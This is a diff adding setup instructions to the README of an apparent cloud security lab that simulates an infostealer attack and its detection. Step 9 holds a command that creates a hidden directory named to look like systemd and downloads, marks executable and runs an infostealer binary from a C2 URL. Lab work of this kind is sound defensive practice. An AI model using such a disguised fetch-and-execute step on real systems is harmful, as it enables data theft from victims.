@@ -34,7 +34,75 @@ The project simulates a multi-stage attack, including the following key componen
 
 ## ⚙️ Lab Setup
 
-HERE
+1. **Install Required Tools**
+    - Download and install [Terraform](https://www.terraform.io/downloads.html).
+    - Download and install [Ansible](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html) (not just the core).
+    - Download and install [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html).
+
+2. **Set Up AWS Credentials and SSH Keys**
+    - Create an AWS account and generate an Access Key for CLI usage.
+    - Run `aws configure` to set up your credentials.
+    - Create a SSH `key_pair` for your VMs
+
+3. **Configure Variables**
+    - Edit `variables.tfvars` and set your `key_pair` and IP address.
+    - You can find your IP address with:  
+      ```bash
+      curl https://ipinfo.io/ip
+      ```
+
+4. **Prepare Deployment Script**
+    - Make the deployment script executable:  
+      ```bash
+      chmod +x deploy.sh
+      ```
+
+5. **Deploy Infrastructure**
+    - Run the deployment script, passing the path to your private key:  
+      ```bash
+      ./deploy.sh path-to-private-key
+      ```
+    - The script runs `terraform apply -auto-approve` and `ansible-playbook -i hosts playbook.yaml`.  
+      You can also run these commands manually if needed and for terraform run `terraform apply` without `-auto-approve` to be asked to perform the actions.
+
+6. **Access the Virtual Machines**
+    - SSH into the web server VM:  
+      ```bash
+      ssh ubuntu@<IP_VM> -i path-to-private-key
+      ```
+
+7. **Troubleshooting**
+    - If you see an error like:
+      ```
+      fatal: [<IP>]: UNREACHABLE! => {"changed": false, "msg": "Failed to connect to the host via ssh: ssh: connect to host <IP> port 22: Connection timed out", "unreachable": true}
+      ```
+      This can rarely happen when running `deploy.sh`. If it does, simply run the script again.
+
+8. **Manual Fix**
+    - On the victim VM, you need to run a script to seed the sensitive data in the machine:
+      ```bash
+      cd /tmp && ./seed_sensitive_files.sh
+      ```
+
+9. **Simulate and Detect the InfoStealer Attack**
+    - On the victim VM, run (simulation of the USB):
+      ```bash
+      mkdir -p ~/.config/.systemd-user/ && cd ~/.config/.systemd-user/
+
+      wget ${C2_URL}/security_debian_x386 -O /tmp/${INFOSTEALER_FILENAME} && chmod +x /tmp/${INFOSTEALER_FILENAME} && python3 /tmp/${INFOSTEALER_FILENAME}
+      ```
+
+        ## **TODO: INSERT THE OTHER STEPS**
+
+10. **Destroy and Clean Up the Environment**
+    - To remove all provisioned resources and avoid unnecessary charges, run:
+        ```bash
+        terraform destroy
+        ```
+- **WARNING: If you do NOT destroy the infrastructure after use, AWS may CHARGE YOU for active resources if you exceed the AWS Free Tier limits!**
+
+
+> **NOTE:** While this setup is designed to stay within AWS Free Tier limits, you may incur small charges (a few cents) for data transfer.
 
 ## 🛡️ Detection and Mitigation Strategies
 
